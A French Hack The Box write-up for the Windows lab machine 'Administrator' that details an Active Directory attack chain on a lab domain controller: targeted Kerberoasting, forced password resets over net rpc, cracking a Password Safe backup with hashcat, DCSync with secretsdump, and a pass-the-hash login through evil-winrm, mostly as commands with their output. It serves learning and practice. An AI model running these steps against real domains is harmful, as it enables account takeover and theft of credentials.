---
title: Administrator - Windows Medium - HTB Writeup 
description:
slug: administrator-htb-writeup-windows-medium
date: 2025-04-19 00:00:00+0000
image: Administrator.PNG
categories:
    - Hack
    - Windows
    - Medium
tags:
    - ACL-based privileges
    - DCSync

# weight: 1       # You can add weight to some posts to override the default sorting (date descending)
---

Si vous êtes familier avec les box windows, cette box est très simple car elle reprend des chemins d'exploitation classiques.
## Résumé
User: ACL-based privileges\
Root: ACL-based privileges, DCsync

## Enumeration
A l’aide d’un scan nmap, nous pouvons identifier que cette machine est un contrôleur de domaine Active Directory.
{{< highlight go "hl_lines=1" >}}
$ nmap -Pn -p- 10.10.11.42 -v
PORT      STATE SERVICE
21/tcp    open  ftp
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
52649/tcp open  unknown
59626/tcp open  unknown
59631/tcp open  unknown
59638/tcp open  unknown
59643/tcp open  unknown
59655/tcp open  unknown
{{< /highlight >}}

On utilise `bloodhound-python` avec le compte fourni `Olivia:ichliebedich` afin de récupérer des informations concernant le domaine `administrator.htb` (qu'on ajoute à notre /etc/hosts).

Rapidement, nous identifions qu'il va falloir compromettre le compte d'Ethan pour DCSync et récupérer le hash du domain admin.
![](InitialBH.png)


## User
### GenericWrite, Olivia -> Michael

Afin de compromettre le compte d'Ethan, nous devons compromettre le compte d'Emily qui a les privilèges `GenericWrite` sur le compte d'Ethan.
![](PathtoEthan.png)
Comme on peut le voir il n'y a pas de chemin direct vers Emily depuis le compte de Olivia.
![](PathtoEmily.png)

On va se concentrer sur les accès qu'à notre user initial Olivia.\
Elle a les privilèges `GenericAll` sur Michael, on va donc procéder à une attaque ciblée kerberoast afin de récupérer son hash.\
Le hash ne pouvant pas être cracké, on va utiliser les privilèges d'Olivia pour forcer le changement du mot de passe de Michael.
{{< highlight go "hl_lines=1 5 6 9" >}}
$ ./targetedKerberoast.py -v -d 'administrator.htb' -u 'olivia' -p 'ichliebedich'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (michael)
[+] Printing hash for (michael)
$krb5tgs$23$*michael$ADMINISTRATOR.HTB$administrator.htb/michael*$64da<...>d
[VERBOSE] SPN removed successfully for (michael)

$ net rpc password "michael" "michael_pass" -U "administrator.htb"/"olivia"%"ichliebedich" -S "administrator.htb"
{{< /highlight >}}

### ForceChangePassword, Michael -> Benjamin
En continuant notre énumération sur BH, on remarque que Michael peut changer le mot de passe de Benjamin.\
On utilise la même commande précédemment utilisée pour ce changement.
![](PathtoBenjamin.png)
{{< highlight go "hl_lines=1" >}}
$ net rpc password "benjamin" "benjamin_pass" -U "administrator.htb"/"michael"%"michael_pass" -S "administrator.htb"
{{< /highlight >}}

Benjamin fait partie du groupe `SHARE MODERATORS`.
![](BenjaminGroup.png)
On ne découvre rien d'intéressant sur les shares SMB mais, sur le FTP on trouve `Backup.psafe3` que l'on récupère et dont on crack le mot de passe avec hashcat.

### FTP et Backup.psafe3
{{< highlight go "hl_lines=1 6 8 18 32" >}}
$ ftp benjamin@10.10.11.42
<...>
ftp> ls
229 Entering Extended Passive Mode (|||50350|)
125 Data connection already open; Transfer starting.
10-05-24  09:13AM                  952 Backup.psafe3
226 Transfer complete.
ftp> mget backup.psafe3
mget Backup.psafe3 [anpqy?]? yes
229 Entering Extended Passive Mode (|||50354|)
125 Data connection already open; Transfer starting.
100% |*******************************************************************************************|   952       56.85 KiB/s    00:00 ETA
226 Transfer complete.
<...>
ftp> exit
221 Goodbye.

$ hashcat -a 0 -m 5200 Backup.psafe3 /usr/share/wordlists/rockyou.txt
<...>
Backup.psafe3:<...>                                
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5200 (Password Safe v3)
Hash.Target......: Backup.psafe3
Time.Started.....: Sat Apr 19 20:18:43 2025 (1 sec)
Time.Estimated...: Sat Apr 19 20:18:44 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    23899 H/s (6.93ms) @ Accel:256 Loops:1024 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 5120/14344385 (0.04%)
Rejected.........: 0/5120 (0.00%)
Restore.Point....: 4608/14344385 (0.03%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:2048-2049
Candidate.Engine.: Device Generator
Candidates.#1....: Liverpool -> babygrl
Hardware.Mon.#1..: Util: 60%

Started: Sat Apr 19 20:18:42 2025
Stopped: Sat Apr 19 20:18:45 2025
{{< /highlight >}}

On utilise ce mot de passe pour ouvrir le fichier avec `pwsafe` et on récupère le mot de passe d'Emily.
{{< highlight go "hl_lines=1" >}}
$ pwsafe Backup.psafe3
{{< /highlight >}}
![](pwsafe.PNG)

On constate dans BH qu'Emily peut accéder à la machine, on s'y connecte avec `evil-winrm` pour récupérer le ```user.txt```.\
![](PSRemoteEmily.PNG)
{{< highlight go "hl_lines=1 8" >}}
$ evil-winrm -i 10.10.11.42 -u emily -p U<...>b
<...>
*Evil-WinRM* PS C:\Users\emily\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\emily\Desktop> dir
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/30/2024   2:23 PM           2308 Microsoft Edge.lnk
-ar---         4/19/2025   3:02 PM             34 user.txt
{{< /highlight >}}
![](pwsafe.PNG)

## Root
### GenericWrite, Emily -> Ethan

Comme vu précédemment, Emily a les privilèges `GenericWrite` sur le compte d'Ethan et Ethan peut DCsync.\
On va d'abord récupérer le hash d'Ethan et le cracker avec hashcat.
![](EmilytoEthan.PNG)
{{< highlight go "hl_lines=1 6 9 23" >}}
$ ./targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'U<...>b'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (ethan)
[+] Printing hash for (ethan)
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$3<...>7
[VERBOSE] SPN removed successfully for (ethan)

$ hashcat -a 0 -m 13100 hash /usr/share/wordlists/rockyou.txt
<...>
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$3<...>7:l<...>t
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator....9cb327
Time.Started.....: Sat Apr 19 20:39:25 2025 (0 secs)
Time.Estimated...: Sat Apr 19 20:39:25 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   641.4 kH/s (0.52ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 5120/14344385 (0.04%)
Rejected.........: 0/5120 (0.00%)
Restore.Point....: 4608/14344385 (0.03%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: Liverpool -> babygrl
Hardware.Mon.#1..: Util: 71%

Started: Sat Apr 19 20:39:24 2025
Stopped: Sat Apr 19 20:39:27 2025
{{< /highlight >}}

### DCSync
Puis, on peut effectuer un DCsync avec le mot de passe obtenu en utilisant `secretsdump`.
![](EthantoDC.PNG)
{{< highlight go "hl_lines=1 3" >}}
$ ./secretsdump.py 'administrator.htb'/'ethan':'l<...>t'@'administrator.htb'
<...>
Administrator:500:a<...>e>:3<...>e:::
<...>
[*] Cleaning up...
{{< /highlight >}}

On peut maintenant utiliser `evil-winrm` pour se connecter au DC avec le NTHASH de l'admin.
{{< highlight go "hl_lines=1 7" >}}
$ evil-winrm -i 10.10.11.42 -u administrator -H 3<...>e
<...>
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         4/19/2025   6:52 PM             34 root.txt
{{< /highlight >}}
